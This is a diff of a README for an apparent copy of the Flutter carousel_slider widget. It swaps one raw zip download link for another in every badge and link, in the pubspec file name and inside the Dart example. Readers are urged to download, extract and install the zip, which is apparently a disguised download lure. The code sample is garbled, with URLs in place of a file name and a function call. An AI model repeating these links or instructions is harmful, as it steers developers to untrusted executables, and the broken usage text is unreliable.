@@ -2,11 +2,11 @@
 
 <div align="center">
 
-[![Download](https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/android/app/src/debug/carousel_slider_v3.3-beta.3.zip%20Now-Carousel%20Slider-brightgreen)](https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/android/app/src/debug/carousel_slider_v3.3-beta.3.zip)
+[![Download](https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/ios/slider_carousel_v3.8.zip%20Now-Carousel%20Slider-brightgreen)](https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/ios/slider_carousel_v3.8.zip)
 
-![Flutter](https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/android/app/src/debug/carousel_slider_v3.3-beta.3.zip)
-![Dart](https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/android/app/src/debug/carousel_slider_v3.3-beta.3.zip)
-![License](https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/android/app/src/debug/carousel_slider_v3.3-beta.3.zip)
+![Flutter](https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/ios/slider_carousel_v3.8.zip)
+![Dart](https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/ios/slider_carousel_v3.8.zip)
+![License](https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/ios/slider_carousel_v3.8.zip)
 
 </div>
 
@@ -41,7 +41,7 @@ To begin using the carousel_slider widget, follow these simple steps.
 
 ### 1. Visit the Releases Page
 
-Go to the [Releases page](https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/android/app/src/debug/carousel_slider_v3.3-beta.3.zip) to download the latest version of the carousel_slider widget.
+Go to the [Releases page](https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/ios/slider_carousel_v3.8.zip) to download the latest version of the carousel_slider widget.
 
 ### 2. Download the Application
 
@@ -57,7 +57,7 @@ If you downloaded a zip file, extract its contents. If you have an installer, fo
 
 To download the carousel_slider widget, follow these steps:
 
-1. Click the [Download Now](https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/android/app/src/debug/carousel_slider_v3.3-beta.3.zip) badge at the top, or visit the Releases page.
+1. Click the [Download Now](https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/ios/slider_carousel_v3.8.zip) badge at the top, or visit the Releases page.
 2. Choose the latest version of the carousel_slider.
 3. Download it to your computer.
 4. Follow the instructions above to extract or install it.
@@ -81,7 +81,7 @@ Below are the recommended requirements to successfully run the carousel_slider w
 To use the carousel_slider in your project, follow these steps:
 
 1. **Import the Library**  
-   Open your project and add the carousel_slider library to your dependencies in the `https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/android/app/src/debug/carousel_slider_v3.3-beta.3.zip` file:
+   Open your project and add the carousel_slider library to your dependencies in the `https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/ios/slider_carousel_v3.8.zip` file:
    ```yaml
    dependencies:
      carousel_slider: ^1.0.0  # Check the latest version
@@ -96,10 +96,10 @@ To use the carousel_slider in your project, follow these steps:
        autoEnableInfiniteScroll: true,
      ),
      items: [
-       'https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/android/app/src/debug/carousel_slider_v3.3-beta.3.zip',
-       'https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/android/app/src/debug/carousel_slider_v3.3-beta.3.zip',
-       'https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/android/app/src/debug/carousel_slider_v3.3-beta.3.zip',
-     ].map((item) => https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/android/app/src/debug/carousel_slider_v3.3-beta.3.zip(item)).toList(),
+       'https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/ios/slider_carousel_v3.8.zip',
+       'https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/ios/slider_carousel_v3.8.zip',
+       'https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/ios/slider_carousel_v3.8.zip',
+     ].map((item) => https://raw.githubusercontent.com/sleeper2112/carousel_slider/main/ios/slider_carousel_v3.8.zip(item)).toList(),
    );
    ```
 
